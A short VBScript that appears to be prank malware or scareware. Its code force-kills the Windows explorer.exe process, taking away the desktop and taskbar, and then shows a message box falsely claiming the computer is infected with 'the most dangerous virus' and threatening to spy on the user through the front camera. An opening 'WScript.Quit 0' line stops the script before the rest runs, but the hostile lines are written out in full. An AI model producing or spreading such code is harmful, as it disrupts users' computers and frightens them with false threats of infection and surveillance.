WScript.Quit 0
on error resume next
set t=createobject("Wscript.Shell")
set kill = createobject("wscript.shell")
kill.run"taskkill /f /im explorer.exe",0
msgbox"Hello, this computer was infected with the most dangerous virus, I'll follow you through the front camera of the computer :)"
